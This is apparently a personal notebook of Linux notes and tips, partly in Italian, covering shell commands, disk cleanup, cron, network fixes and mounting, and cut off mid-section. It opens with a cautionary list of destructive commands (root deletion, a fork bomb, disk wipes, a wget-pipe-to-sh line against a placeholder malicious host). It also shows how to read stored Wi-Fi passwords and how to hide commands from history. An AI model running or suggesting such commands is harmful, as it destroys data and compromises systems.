---
created: 2024-02-12T23:29
updated: 2025-03-11T20:20
share_link: https://share.note.sx/ej070ee9#d4FdX8CIb0FbLC+elE2ISplriX2eaABOFM+S2hstZ68
share_updated: 2024-10-16T17:24:48+02:00
---
creator for linux suggested: [LearnTheShell – Medium](https://medium.com/@learntheshell) & [Audrey's weBlog & reViews – Medium](https://medium.com/@audrey_evans)

risorse utili: [TCM - Linux 101 | TCM Security Academy Notes - by syselement](https://blog.syselement.com/tcm/courses/linux-101)

101 Linux command ebook :   [ebook](https://mega.nz/file/LI0SlARB#NJpt2GNVmAHPjZUYUWlE7w3U4ZQwkwhJEj42wU3-ivY)

*Top 10 Deadly Linux Commands You Should Never Run (Unless You Want Chaos)*

```bash
1. rm -rf /
Deletes everything from the root directory without warning.
Result: Total system wipe.

2. :(){ :|:& };: (Fork Bomb)
Creates infinite processes to crash your system.
Result: System freeze or crash.


3. mkfs.ext4 /dev/sdX
Formats the given disk.
Result: Complete data loss.

4. dd if=/dev/zero of=/dev/sdX
Overwrites the disk with zeros.
Result: Irrecoverable data wipe.

5. chmod -R 000 / or chmod -R 777 /
Changes permissions for all files.
Result: System becomes unusable or insecure.

6. mv / /dev/null
Moves your entire root directory into nothingness.
Result: Say goodbye to your OS.

7. >/dev/sda
Overwrites the boot sector.
Result: System won't boot.

8. yes > /dev/sda
Fills your disk with infinite "yes".
Result: Disk corruption.

9. find / -name "important_file" -exec rm -rf {} \;
Deletes every file named "important_file".
Result: Selective, but permanent deletion.

10. wget http://malicious-url.com -O- | sh
Downloads and runs a script from the internet.
Result: Malware attack.
```

## "Low on Space in Kali Linux? Here's How I Fixed It and Freed Up GBs"

> **"No space left on device."**

#### Step 1: Check What's Eating Space

Open a terminal and run:

```bash
sudo du -sh /*
```

_This gives you a summary of how much space each top-level directory is using. To go deeper into any suspect folder:

```bash
sudo du -sh /var/*
```

_Use this recursively to identify culprits like logs, apt cache, or even user-generated files.

#### Step 2: Clear Apt Cache

_Sometimes the APT cache gets bloated with package data:

```bash
sudo apt clean sudo apt autoclean
```

Also useful:

```bash
sudo apt autoremove
```

This removes unused dependencies.

#### Step 3: Remove Old Logs

Kali stores logs in `/var/log`. You can compress or delete logs you don't need.

```bash
sudo journalctl — vacuum-time=7d
```

This clears logs older than 7 days.

#### Step 4: Clean Up Thumbnails (If GUI is Installed)

Thumbnails pile up in `.cache`:

```bash
rm -rf ~/.cache/thumbnails/*
```

#### Step 5: Find Large Files

Use `ncdu`, a nifty tool to visually explore disk usage:

```bash
sudo apt install ncdu sudo ncdu /
```

This interactive tool helped me find ISO files I'd forgotten about!

> Bonus: Delete Old Kernels

If you're running out of `/boot` space:

```bash
dpkg — list | grep linux-image sudo apt remove linux-image-x.x.x-xxx-generic
```

#### Be cautious: **Don't remove your current kernel.**

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — 

#### cheatsheet Linux Command for DevOps

https://vinodhakumara2681997.medium.com/cheatsheet-linux-commands-for-devops-80be32b88656

https://github.com/infinite-education/linux-admin-roadmap

![[Pasted image 20240615023030.png]]

See for linux commands: https://ss64.com/bash/

Know more about linux: [Home | Knowledge Base by phoenixNAP](https://phoenixnap.com/kb/)

> ls - show other files in the directory you're in (ls = list files)   [you can use "la" too]

> uname -r    -  Check the kernel version.

> pwn - see in what directory you're in (pwd = print working directory)

> touch - create file

> mkdir - create directory

> rmdir - remove directory

> cp - copy directory

> mv - move directory to file o folder

> rm - remove file

> file - what filetype is a file

> wc -l   <*file_name*> - see content of a file

> vim - view source code of a file, and modify it

> nano - modify file

> top - check linux programs usages

> su -l <*user*>  - return to a normal user after doing "sudo su" to become root user

or you can execute a specific command as the target

> sudo su -c "command" -s /bin/bash <*username*> 

fully update system:

> sudo apt update && sudo apt -y full-upgrade

search for packages

> sudo apt search <*package_name*>   (like sudo apt search vncview or whatever...)

see system status:

> systemctl status

redu last command as sudo:

> sudo !!

install packages:

> sudo apt install <*package_name*> -y

search packages:

> search apt <*package_name*>

create a file zip:

> zip newfilename.zip  oldfile.txt  --encrypt

renominate a file type:

![[Pasted image 20241109141443.png]]

extract .gz file types:

> sudo gzip -d filename.gz


_find filepath:_

To see the file path of a file in Linux, you can use the `realpath` command. Here's how you can do it:

1. **Using** `realpath`:
    
    
    ```sh
    realpath filename
    ```
    
    Replace `filename` with the name of your file. This command will output the absolute path of the file.
    
2. **Using** `readlink`:
    
    
    ```sh
    readlink -f filename
    ```
    
    This command also provides the absolute path of the file.
    
3. **Using** `pwd` **with** `ls`: If you want to see the path of a file in the current directory, you can combine `pwd` (print working directory) with `ls`:
    
    
    ```sh
    pwd
    ls
    ```


### MkDir Problem:

mkdir: cannot create directory ‘<*filepath*>’: File exists

> rm -r <*filepath*>


### error: externally-managed-environment

You encounter this error while trying to install something with pip:

quick fix, use --break-system-packages:
![[Pasted image 20241201140347.png]]

# Find Stored Wifi passwords:

### Using the Terminal

1. **Open Terminal**: Press `Ctrl + Alt + T` to open the Terminal.
    
2. **Run Command**: Type the following command and press Enter:
    
```bash
    nmcli device wifi show-password
```

![[Pasted image 20250206065002.png]]

**Find Saved Passwords**: If you want to find the password for a previously connected network, navigate to the directory:

```shell
cd /etc/NetworkManager/system-connections

```

then list the files with "ls" and open the desired network file with a text editor (you'll need root permissions):

```
sudo nano <network_name>.nmconnection
```

Look for the `psk` line under the `wifi-security` section to find the password


## Make script file:

> nano myscript.sh -> insert code script inside and save and exit.

give executable perms:

> chmod +x myscript.sh

run it with the following subdomain:

> ./myscript.sh example.com

### How to do it with a file?

> nano multi_domain_scan.sh

```Bash
#!/bin/bash

# Check if the file with domains is provided
if [ -z "$1" ]; then
    echo "Usage: $0 file.txt"
    exit 1
fi

# Read each domain from the file and process it
while IFS= read -r domain; do
    echo "Processing $domain"
    cd recon/$domain
    echo $domain | assetfinder -subs-only | tee $domain.assetfinder
    echo $domain | subfinder -all --recursive -o $domain.subfinder
    findomain -t $domain --external-subdomains -u $domain.findomain
    echo ">> Finished collecting subdomains" | tee -a ../../logs.txt
    sleep 1

    # Filter duplicate subdomains
    cat $domain.assetfinder $domain.subfinder $domain.findomain | sort -u | filter-resolved | tee $domain.resolved
    echo ">> Removed duplicate subdomains" | tee -a ../../logs.txt
    echo ">> Found $(cat $domain.resolved | wc -l) subdomains for $domain" | tee -a ../../logs.txt

    # Check alive subdomains
    cat $domain.resolved | httpx -title -web-server -status-code -follow-redirects -o $domain.info
    cat $domain.resolved | httprobe -c 100 | tee $domain.robe
    cat $domain.info | awk '{ print $1 }' | tee $domain.httpx

    echo ">> Found $(cat $domain.robe | wc -l) HTTProbe and $(cat $domain.httpx | wc -l) HTTPx subdomains for $domain" | tee -a ../../logs.txt
done < "$1"

```

> chmod +x multi_domain_scan.sh

>./multi_domain_scan.sh file.txt
    

This script will read each domain from `file.txt` and process it using the commands you provided. Make sure that the `recon` directory and subdirectories for each domain exist before running the script.



split multiple files:


![[Pasted image 20241115173853.png]]

### New  Linux Tricks:

source from: https://freedium.cfd/https://infosecwriteups.com/powerful-linux-tricks-that-will-change-your-life-bb515d560bcf

#### Create Multiple Folders in One Command

Managing files and directories is one of the most common tasks in Linux, especially when you're working on a project.

```bash
mkdir {dev,test,prod}
```

#### **Building Complex Folder Structures**

This trick gets even more powerful when you need to create subdirectories. Let's say you're organizing a project with folders for different environments (dev, test, prod) and services (backend, frontend).

Instead of creating each folder manually, you can combine braces and let Linux do the heavy lifting:

```bash
mkdir -p {dev,test,prod}/{backend,frontend}
```

Here's what's happening:

- The -p flag tells mkdir to create parent directories as needed. This prevents errors if the parent folders don't already exist.
- The first set of braces {dev,test,prod} creates the environment folders.
- The second set {backend,frontend} creates the subfolders for each service.

When you run this command, you'll get the following structure:

```
dev/
 backend/
 frontend/
test/
 backend/
 frontend/
prod/
 backend/
 frontend/
```

#### **Real-World Use Cases**

When setting up a new web project, you often need folders for development. Use mkdir with braces to create them in one command:

```
mkdir -p project/{html,css,js}
```

#### **Batch Creation for Logs or Backups**

Generate folders for daily logs or backups:

```
mkdir -p logs/{2025–01–01,2025–01–02,2025–01–03}
```

#### **Create a Directory and Change Into It**

Save time by combining mkdir and cd in one command using &&. For instance, if you want to create a directory and immediately navigate into it:

```bash
mkdir my_project && cd my_project
```

#### Rename Files with mv and Braces {}

Renaming files in bulk is a common need when organizing datasets, images, logs, or project files. Doing it manually can be time-consuming and error-prone.

**Thankfully, you can use the mv command, along with braces {}, loops, and shell expansions, to automate the process efficiently.**

Let's say you have a series of image files named like this:

```bash
img1.jpg
img2.jpg
img3.jpg
```

You want to rename them to something more meaningful, such as:

```bash
photo_1.jpg 
photo_2.jpg
photo_3.jpg
```

Manually renaming these files with multiple mv commands would be tedious:

```bash
mv img1.jpg photo_1.jpg 
mv img2.jpg photo_2.jpg 
mv img3.jpg photo_3.jpg
```

For larger numbers of files or more complex patterns, this approach is inefficient.
#### **The Solution: Using Braces and Loops**

By combining shell features like braces {} and loops, you can rename files in bulk with minimal effort. Here's a powerful command:

```bash
for i in {1..3}; do mv img$i.jpg photo_$i.jpg; done
```

#### **How It Works**

The for loop Iterates over a sequence of numbers {1..3} and assigns each number in the sequence to the variable i during each iteration.

The mv Command moves (renames) files and replaces img$"i".jpg (e.g., img1.jpg) with photo_ $i.jpg (e.g., photo_1.jpg) for each value of "i".


#### example use case: Generate Multiple Files with a Single Command

```bash
touch file {1..100}.txt
```

#### **Generate Files with Custom Names**

You can mix and match text in the file names using braces.

Example:

Create log files for three servers (server1, server2, server3) across three months (Jan, Feb, Mar):

```bash
touch {server1,server2,server3}_{Jan,Feb,Mar}.log
```

Result:

```bash
server1_Jan.log, server1_Feb.log, server1_Mar.log

server2_Jan.log, server2_Feb.log, server2_Mar.log

server3_Jan.log, server3_Feb.log, server3_Mar.log
```

This saves you from creating these 9 files manually, one at a time.

#### **Create Multiple Files with Extensions**

You can create multiple files with different extensions in one command:

Example:

```
touch project.{html,css,js}
```

#### Deleting Files or Directories Efficiently

Managing files and directories in Linux can sometimes mean cleaning up clutter. Whether you're targeting specific files, copying multiple files to a new location, or removing everything from a directory.

#### **Deleting Multiple Files**

You can delete several files with one command:

```bash
rm file1.txt file2.txt file3.txt
```

remove all files in a directory

```bash
rm *
```

#### **Deleting Directories**

Use the -r (recursive) flag to delete directories and all their contents:

```bash
rm -r my_folder
```

#### **Delete Files by Name**

To delete all .log files in the current directory and subdirectories use:

```bash
find . -name "*.log" -type f -delete
```

**.**  : Searches in the current directory and its subdirectories.

**-name "*.log"**: Matches files with the .log extension.

**-type f:** Ensures only files are deleted.

**-delete:** Deletes the matching files.

#### **Copying Multiple Files to a Location**

To copy multiple files to a directory type:

```bash
cp file1.txt file2.txt file3.txt /destination/folder/
```

#### **Copy All Files with Specific Extensions**

To copy all .txt files to another folder use:

```bash
cp *.txt /destination/folder/
```

#### **Copy Files and Subdirectories**

To copy all files and subdirectories (including their contents) to another folder, use the -r (recursive) option:

```bash
cp -r . /backup/my_project/
```

#### **Remove Everything from a Directory**

If you want to completely clear a directory but leave the directory itself type:

```bash
rm -rf /path/to/folder/*
```

#### Jump Between Directories and Return to the Last Directory

Navigating between directories is one of the most common tasks when working on Linux. However, moving around deeply nested directories can become tedious.

Luckily, there are tricks you can use to jump between directories effortlessly with the cd command. Let's explore these and make your directory navigation faster and smoother.

#### **Switching Back and Forth**

Suppose you're in /home/, and you move to /var/logs using:

```bash
cd var/logs
```

Now, to return to /home instantly, use:

```bash
cd -
```


Need to go back to /var/logs again? Just repeat:

```bash
cd -
```

>Tip: cd — alternates between your current directory and the last one, so you can bounce back and forth.

#### **Navigate Back One Level or Multiple Levels**

If you're in /home/user/projects/webapp, and you want to move to /home/user/projects, use:

```bash
cd ..
```

Combine .. with slashes to move up multiple levels:

```bash
cd ../../
```

From /home/user/projects/webapp, this would take you directly to /home/user.

#### **Go Directly to Your Home Directory**

The quickest way to get back to your home directory from anywhere:

```bash
cd
```

#### **Use Tab Completion**

When typing a path, press the **Tab** key, and Linux will autocomplete the directory name for you. This is especially useful for long directory names.

For example:

```bash
cd /var/lo<TAB>
```

Autocompletes to:

```bash
cd /var/logs
```

these tricks help you move faster in the linux environment:

#### **Quickly Find Files with find and locate**

Searching for files on Linux can be a daunting task if you're manually navigating through a maze of directories.

Luckily, Linux offers powerful tools like find and locate to make file searching faster and more efficient.

The find command is incredibly flexible and allows you to search for files and directories based on various criteria like name, type, size, or modification date.

#### **Search for Files by Name**

Let's say you want to find a file named notes.txt in your current directory and its subdirectories:

```bash
find . -name "notes.txt"
```

**.** means start searching in the current directory.

**-name** tells find to look for files with the exact name.

#### **Search for Files with a Specific Extension**

To find all .log files in /var/log, use:

```bash
find /var/log -name "*.log"
```

#### **Search for Directories**

To search for a directory named projects, use:

```bash
find /home/user -type d -name "projects"
```

- **type d** limits the search to directories only.

#### **Find Files Larger than a Certain Size**

If you're looking for files larger than 100MB in your system's /var directory, use:

```bash
find /var -type f -size +100M
```

- **type f** restricts the search to files.
- **size +100M** finds files larger than 100 megabytes.

#### **Using locate for Fast Searches**

The locate command is faster than find because it relies on a pre-built database of file locations.

#### **Basic Search**

If you're looking for a file named config.yaml, use:

```bash
locate config.yaml
```

#### **Combine locate with grep**

Want to narrow down your search for .log files in /var, use:

```bash
locate /var | grep "\.log"
```

#### **Search and Compress Logs**

Find all .log files and compress them into a .tar.gz archive:

```bash
find /var/log -name "*.log" | xargs tar -czf logs.tar.gz
```


#### Save Time with History Tricks

For example, if your last five commands were:

```bash
100 ls -a
101 cd tmp/ 
102 mkdir new_folder
103 touch file.txt
104 history
```

Running history 5 will show:

```bash
history 5
```

```bash
100 ls -a
101 cd tmp/ 
102 mkdir new_folder
103 touch file.txt
104 history
```

#### **Recalling a Specific Command**

You can also execute a command from your history by referencing its number. For example, if you want to run command number 3 from the history, you can use:

```bash
!3
```

#### **Searching Command History**

The Ctrl + R shortcut is a super-efficient way to search through your command history when you can't remember the exact command you used earlier.

Imagine you're working with Docker and ran a long command like:

```bash
docker run -d -p 8080:80 nginx
```

If you want to re-run it but can't remember the full command, you can:

Press Ctrl + R and start typing docker. The terminal might display:

```bash
(reverse-i-search)`docker': docker run -d -p 8080:80 nginx
```

Press Enter to re-execute the command instantly. This trick saves you from scrolling through the entire history or retyping long commands.

#### **Redirecting Output to a File**

Redirects are used to save command output into a file. Let's say you want to save the sorted and filtered results into a new file.

```bash
cat data.txt | sort | uniq > new_data.txt
```

_**>** overwrites the new_data.txt file with the output._

#### **File Previews Using head, tail, and less**

When you're working with files in Linux, you often don't need to open the entire thing just to check its contents.

Instead of opening large files with heavy editors, these tools let you quickly preview or navigate them directly in the terminal.

Let's say you want to see the first 10 lines of a file:

```bash
head data.txt
```

Or specify the number of lines:

```bash
head -n 5 data.txt
```

To see the last 10 lines:

```bash
tail data.txt
```

Use less to scroll through a large file interactively:

```bash
less data.txt
```

_Use the arrow keys to navigate and q to quit._

#### **Batch Renaming Files**

Renaming multiple files manually is tedious, but Linux offers efficient ways to batch rename.

Let's say you're working on a project where test files (file1.txt, file2.txt, etc.) need to be renamed to something more descriptive (doc1.txt, doc2.txt, etc.).

```bash
rename 's/file/doc/' file*.txt
```

This command replaces the word "file" in the filenames with "doc" for all .txt files that match the pattern file*.txt.

Resulting Files:

```
doc1.txt
doc2.txt
```

#### **Manage Multiple Terminal Windows**

Screen is a powerful tool in Linux that allows you to manage multiple terminal sessions from a single window.

It's like having multiple tabs within your terminal, but without having to open a bunch of separate terminal windows.

You can also detach and reattach sessions, which is particularly useful for running long tasks or managing remote servers. To start using screen, simply run:

```bash
screen -S mysession
```

This command will start a new screen session, and you'll be inside a shell. It's like opening a full-screen terminal window. -S allows you to give your session a name, in this case, **mysession.**

Now, inside this screen session, let's run a process. For example, let's run a long-running command, like ping test to google.com:

```bash
ping google.com
```

This command will keep running until you manually stop it. While the process (ping in this case) is still running, press:

```bash
Ctrl + A, then D
```

This will detach you from the screen session, but the ping command will continue to run in the background.

#### **Reattach to the screen Session**

To check on the process again, you can reattach to your screen session with the following command:

```bash
screen -r mysession
```

This will bring you back to the screen session with the running ping command, where you can see the results.

Once you're done with your work, you can exit a screen session by simply typing:

```bash
exit
```

This simple screen workflow allows you to start a task, detach from it, and then reattach to check on the progress later without interrupting the process.

#### **Move to the Beginning or End of the Line**

- **Ctrl + A** moves your cursor to the beginning of the line.
- **Ctrl + E** moves your cursor to the end of the line.

#### **Clear the Line**

What it does:

- **Ctrl + U** deletes everything from the cursor to the beginning of the line.
- **Ctrl + K** deletes everything from the cursor to the end of the line.

#### **Creating Aliases for Common Commands**

Aliases are another great way to speed up your workflow. By creating short, custom commands, you can replace long, repetitive commands with something quicker and easier to type.

You can create aliases by adding them to your ~/.bashrc file (for bash users).

#### **Basic Syntax for Creating Aliases**

#### **Creating Aliases for Common Commands**

Aliases are another great way to speed up your workflow. By creating short, custom commands, you can replace long, repetitive commands with something quicker and easier to type.

You can create aliases by adding them to your ~/.bashrc file (for bash users).

If you frequently navigate to the same directories, you can create an alias to save time. For example:

```bash
alias name='command'
```


```bash
alias projects='cd /projects'
```

Now, typing $_"projects"_$ in the terminal will take you directly to projects, saving you from typing the full path every time.

#### **Updating Your System**

If you often update your system (on a Debian-based distribution), you can create an alias to do it with a single command:

```bash
alias update='sudo apt update && sudo apt upgrade -y'
```

_With this alias, typing update in your terminal will automatically update your package list and upgrade installed packages, all in one command._

#### **Listing Files with More Details**

When you list files with ls, you might often want to include detailed information such as file permissions, sizes, and modification dates. To do this, you can create an alias without typing a long command every time.

```bash
alias ll='ls -lAh — color=auto'
```

Now, typing **"ll"** will list files in a human-readable format (with sizes like KB, and MB), including hidden files, and with colors for easy identification.

#### **Quick Backup Alias**

Creating backups is important, and doing it quickly is even better. Here's an alias that makes a simple backup.

```bash
alias backup='cp -r ~/important_data ~/backups/'
```

_With this alias, typing backup will instantly copy the contents of ~/important_data to the ~/backups/ folder._

#### **Clean Up System Logs**

If you're managing logs, you might want to clear them periodically. Here's an alias that helps with that.

```bash
alias cleanlogs='sudo rm -rf /var/log/*.log'
```

_By typing "cleanlogs", you can quickly remove all .log files from the system's log directory._

#### **Schedule Scripts with Cron**

Run scripts at specific times using corn. Whether it's daily backups, system maintenance, or even custom scripts, cron jobs help you automate repetitive tasks efficiently.

To manage cron jobs, open your terminal and type the following command:

```bash
crontab -e
```

This command opens your personal crontab file, where you can define your scheduled tasks. Each line in a crontab file specifies a task, its schedule, and the command to execute. The format is:

```bash
* * * * * /path/to/command
 | | | | |
 | | | | + — — Day of the week (0 — Sunday, 6 — Saturday)
 | | | + — — — Month (1–12)
 | | + — — — — Day of the month (1–31)
 | + — — — — — Hour (0–23)
 + — — — — — — Minute (0–59)
```

#### **Examples:**

- `0 2 * * * /path/to/backup.sh` runs the backup.sh script every day at 2 AM.
- `30 14 1 * * /path/to/cleanup.sh` runs cleanup.sh at 2:30 PM on the 1st of every month.

#### **Scheduling a Daily Backup**

Add the following line to your crontab to back up a folder every day at 2 AM:

```bash
0 2 * * * /home/user/scripts/backup.sh
```

#### **Automating System Cleanups**

Schedule a cleanup job to remove temporary files from the /tmp directory every Sunday at 1 AM:

```bash
0 1 * * 0 find /tmp -type f -mtime +7 -exec rm {} \;
```

_This removes files older than 7 days from the /tmp directory every Sunday._

#### **Weekly Disk Usage Reports**

Generate and email a disk usage report every Monday at 8 AM:

```bash
0 8 * * 1 df -h | mail -s "Disk Usage Report" user@mail.com
```

_Replace <mark style="background: #FFB8EBA6;">user@mail.com</mark> with your email address._

#### **View Scheduled Cron Jobs**

To see your existing cron jobs, run:

```bash
crontab -l
```

_lists your active jobs on your crontab_

-- read next https://medium.com/@frost1/essential-linux-tricks-with-python-everyone-should-know-87bab055517d




---
## in caso di problemi di rete::

1. **Verifica i DNS**:
    
    - A volte, i problemi di connessione possono essere causati da DNS non corretti. Prova a cambiare i DNS con quelli di Google:
        
        ```bash
        sudo nano /etc/resolv.conf
        ```
        
        Aggiungi queste righe:
        
        ```plaintext
        nameserver 8.8.8.8
        nameserver 8.8.4.4
        ```
        
2. **Controlla i log di sistema**:
    
    - I log di sistema possono fornire indizi utili. Controlla i log di NetworkManager:
        
        ```bash
        sudo journalctl -u NetworkManager
        ```
        
3. **Verifica la configurazione del proxy**:
    
    - Se stai usando un proxy, assicurati che sia configurato correttamente. Puoi verificare le impostazioni del proxy con:
        
        ```bash
        env | grep -i proxy
        ```
        
4. **Disabilita IPv6**:
    
    - A volte, disabilitare IPv6 può risolvere problemi di connessione. Puoi farlo aggiungendo queste righe a `/etc/sysctl.conf`:
        
        ```plaintext
        net.ipv6.conf.all.disable_ipv6 = 1
        net.ipv6.conf.default.disable_ipv6 = 1
        net.ipv6.conf.lo.disable_ipv6 = 1
        ```
        
        Poi applica le modifiche con:
        
        ```bash
        sudo sysctl -p
        ```
        
5. **Aggiorna il kernel**:
    
    - Un kernel obsoleto può causare problemi di compatibilità. Prova ad aggiornare il kernel:
        
        ```bash
        sudo apt-get update
        sudo apt-get dist-upgrade
        ```
        
6. **Usa un adattatore di rete USB**:
    
    - Se stai usando una VM, prova a collegare un adattatore di rete USB e configurarlo direttamente sulla VM.

E.G.

![[Pasted image 20240822233026.png]]


**Compile and Execute Exploit**

- Download and compile the exploit:

> gcc exploit.c -o exploit ./exploit




do a command from the file editor:

step 1:

write a command on the editor and save:

![[Pasted image 20240728034409.png]]

when you exit, it will do that command: 

![[Pasted image 20240728034504.png]]

By adding a "space" after the command, it won't be shown in the history command:



![[Pasted image 20240728035203.png]]


type "fc" to fix long commands:

supposing you have written something long and you have to re-type it... you can simply type "fc"
 and will put the command in the file editor and after saving it, will automatically run it:

![[Pasted image 20240728035527.png]]

![[Pasted image 20240728035622.png]]

![[Pasted image 20240728035543.png]]
								command runned successfully


![[Pasted image 20240728035641.png]]

ssh -L (local-Port:Remote-Host:on-Port   credentials -N)

	 usefull when is something running in the cloud, (not exposed publicly but locally)

![[Pasted image 20240728035948.png]]

	creates 6 folders with one command

Supposibly you need 100 folders:

![[Pasted image 20240728040122.png]]

**Tip:** to see them all: 

```Bash

ls -l *

```

	 a 100 folders and a 100 folders in each of those.

![[Pasted image 20240728040338.png]]


for example you want to know what happened when it dosen't shows output:

in this case we  put a file.txt and pipe it out

![[Pasted image 20240728040506.png]]

but if you want to know the output:

just simply add "tee -a log.txt" and the output will be in the "log.txt" file:

==("-a" stands for "append to a file")==

![[Pasted image 20240728040625.png]]

We could demostrate this by putting the command "sleep 123 and then we put it on the background"

and then the command:

![[Pasted image 20240728043150.png]]

when you close the terminal when a command is running, the terminal receives a hang up of signal, and sends it to all the child processes killing them which  will stop whatever was doing.


But by doing **disowned** you detach from the terminal and then it will not receive a hang up signal, <mark style="background: #FF5582A6;">SO basically disables all the processes that the terminal opened and then you simply exit.</mark>

> disown -a && exit

so it leaves the terminal, but if i come back the command will come back to re-run


And you can see that the command is still running until it finishes:

![[Pasted image 20240728042655.png]]



---

## File System Examples

Here are the most common file system examples:

- **File Allocation Table (FAT).** FAT is compatible with many operating systems, such as DOS, Windows, Mac OS, and [Unix-based system](https://phoenixnap.com/glossary/what-is-unix)s. It is most commonly used for removable media like USB flash drives or SD cards. The FAT32 variant is limited to the maximum file size of 4GB and volume of 2TB.
- **Extended File Allocation Table (exFAT).** This is an updated version of the FAT system that expands its size up to 16EB and volume up to 128PB.
- **Fourth Extended File System (Ext4).** This file system is used by Linux and supports larger files and volumes (up to 1EB for files and 16TB to 1EB for volumes).
- **Global File System (GFS).** GFS is a shared-disk file system for Linux computer clusters. It allows concurrent access to the same shared block storage to all nodes.
- **Hierarchical File System (HFS).** HFS is a file system developed by Apple for use on Macintosh computers. It has been superseded by HFS+, which offers better performance and supports larger files and volumes.
- **Universal Disk Format (UDF).** UDF is a file system standard for optical media, such as CDs, DVDs, and Blu-ray Discs. It supports larger files and volumes than its predecessor, ISO9660.
- **New Technology File System (NTFS).** NTFS is a file system developed by Microsoft for the Windows operating system. Starting with Windows NT, NTFS offers support for large files and volumes, advanced data protection and recovery capabilities, and file-level security.
- **Apple File System (APFS).** [APFS](https://phoenixnap.com/glossary/apfs-apple-file-system) is a file system developed by Apple as a replacement for HFS+. It improves efficiency, reliability, and security for flash/SSD storage. It also features strong encryption, space sharing, and fast directory resizing.

----
## mount 

_what is mount in linux?_

**Attach** (mount) file systems and removable devices


On Linux and UNIX operating systems you can use the mount command to **attach (mount) file systems and removable devices** such as USB flash drives at a particular mount point in the directory tree.

Examples:

## Linux mount Command Syntax

The standard **`mount`** command syntax is:

```
mount -t [type] [device] [dir]
```

The command instructs the kernel to attach the file system found on **`[device]`** at the **`[dir]`** directory. The **`-t [type]`** option is optional, and it describes the file system type ([EXT3](https://phoenixnap.com/glossary/ext3), EXT4, [BTRFS](https://phoenixnap.com/glossary/btrfs), XFS, HPFS, VFAT, etc.).

If the destination directory is omitted, it mounts the file systems listed in the _/etc/fstab_ file.

While the file system is mounted, the previous contents, owner, and mode of the **`[dir]`** directory are invisible, and the **`[dir]`** pathname refers to the file system root.

**Exit Status**

The **`mount`** command returns one of the following values that indicate the process completion status:

- **`0`**. Success.
- **`1`**. Incorrect command invocation or insufficient permissions.
- **`2`**. System error.
- **`4`**. Internal mount bug.
- **`8`**. Operation interrupted by user.
- **`16`**. Issues with writing or locking the _/etc/mtab_ file.
- **`32`**. Mount failure.
- **`64`**. At least one mount operation succeeded, but not all.

### mount Command Options

The **`mount`** command options further specify file system types, mount location, and type. The following table shows the most common **`mount`** options:

| Option           | Description                                                                                                                                                                                                                                                                       |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`-a`**         | Mounts all file systems listed in _/etc/fstab_.                                                                                                                                                                                                                                   |
| **`-F`**         | Forks a new incarnation of **`mount`** for each device. Must be used in combination with the **`-a`** option.                                                                                                                                                                     |
| **`-h`**         | Displays the help file with all command options.                                                                                                                                                                                                                                  |
| **`-l`**         | Lists all the file systems mounted and adds labels to each device.                                                                                                                                                                                                                |
| **`-L [label]`** | Mounts the partition with the specified **`[label]`**.                                                                                                                                                                                                                            |
| **`-M`**         | Moves a subtree to another location.                                                                                                                                                                                                                                              |
| **`-O [opts]`**  | Used in combination with **`-a`**, it limits the file system set that **`-a`** applies to. The **`[opts]`** refers to options specified in the options field of the _/etc/fstab_ file. The command accepts multiple options specified in a comma-separated list (without spaces). |
| **`-r`**         | Mounts the file system in read-only mode.                                                                                                                                                                                                                                         |
| **`-R`**         | Remounts a subtree in a different location, making its contents available in both places.                                                                                                                                                                                         |
| **`-t [type]`**  | Indicates the file system type.                                                                                                                                                                                                                                                   |
| **`-T`**         | Used to specify an alternative _/etc/fstab_ file.                                                                                                                                                                                                                                 |
| **`-v`**         | Mounts verbosely, describing each operation.                                                                                                                                                                                                                                      |
| **`-V`**         | Displays the program version information.                                                                                                                                                                                                                                         |

Run the **`man mount`** command for a complete list of options, syntax forms, and [filesystem](https://phoenixnap.com/glossary/filesystem)-specific mount options.

## Linux mount Command Examples

Outlined below are the most common use cases of the **`mount`** command.

### List Mounted File Systems

Run the **`mount`** command without any options to display all currently mounted file systems. The output also displays the mount points and mount options.

For example:

![[Pasted image 20240518004438.png]]

### List Specific File Systems

The **`-t`** option allows users to specify which file systems to display when running the **`mount`** command. For example, to show only ext4 file systems, run the following command:

```
mount -t ext4
```

![[Pasted image 20240518004530.png]]

### Mount a File System

Mounting a file system requires the user to specify the directory or mount point to which the file system will be attached. For example, to mount the **`/dev/sdb1`** file system to the **`/mnt/media`** directory, run:

```
sudo mount /dev/sdb1 /mnt/media
```

To specify additional file system-specific mount options, pass the **`-o`** flag followed by the options before the device name. Use the following syntax:

```
mount -o [options] [device] [dir]
```

### Mount File System with /etc/fstab

The _/etc/fstab_ file contains lines describing the mount location of system devices and the options they are using. Generally, _fstab_ is used for internal devices, such as CD/DVD devices, and network shares ([samba](https://phoenixnap.com/kb/ubuntu-samba)/nfs/sshfs). Removable devices are typically mounted by the **`gnome-volume-manager`**.

Providing only one parameter (either **`[dir]`** or **`[device]`**) causes **`mount`** to read the contents of the _/etc/fstab_ configuration file to check if the specified file system is listed in it. If the given file system is listed, **`mount`** uses the value for the missing parameter and the mount options specified in the _/etc/fstab_ file.

The defined structure in _/etc/fstab_ is:

```
<file system> <mount point> <type> <options> <dump> <pass>
```

The following screenshot shows the contents of the _/etc/fstab_ file:

![[Pasted image 20240518010725.png]]

To mount a file system specified in the _/etc/fstab_ file, use one of the following syntaxes:

```
mount [options] [dir]
```

```
mount [options] [device]
```

- For **`[dir]`**, specify the mount point.
- For **`[device]`**, specify the device identifier.

### Mount USB Drive

Modern Linux distributions automatically mount removable drives after insertion. However, if the automatic mount fails, follow the steps below to mount the USB drive manually:

1. Create a mount point using the [mkdir command](https://phoenixnap.com/kb/create-directory-linux-mkdir-command):

```
mkdir /media/usb-drive
```

2. Find the USB device and file system type. Run:

```
fdisk -l
```

![[Pasted image 20240518010922.png]]

Using the device identifier from [fdisk](https://phoenixnap.com/kb/delete-partition-linux#ftoc-heading-2) output, mount the USB drive using the following syntax:

```
sudo mount [identifier] /media/usb-drive
```

For example, if the device is listed as **`/dev/sdb1`**, run:

```
sudo mount /dev/sdb1 /media/usb-drive
```

### Mount a CD-ROM

Being a removable device, Linux automatically mounts CD-ROMs as well. However, if mounting fails, mount a CD-ROM manually by running:

```
mount -t iso9660 -o ro /dev/cdrom /mnt
```

Make sure that the **`/mnt`** mount point exists for the command to work. If it doesn't, create one using the **`mkdir`** command.

**`iso9660`** is the standard file system for CD-ROMs, while the **`-o ro`** options cause **`mount`** to treat it as a read-only file system.

### Mount ISO Files

Mounting an ISO file requires mapping its data to a loop device. Attach an ISO file to a mount point using a loop device by passing the **`-o loop`** option:

```
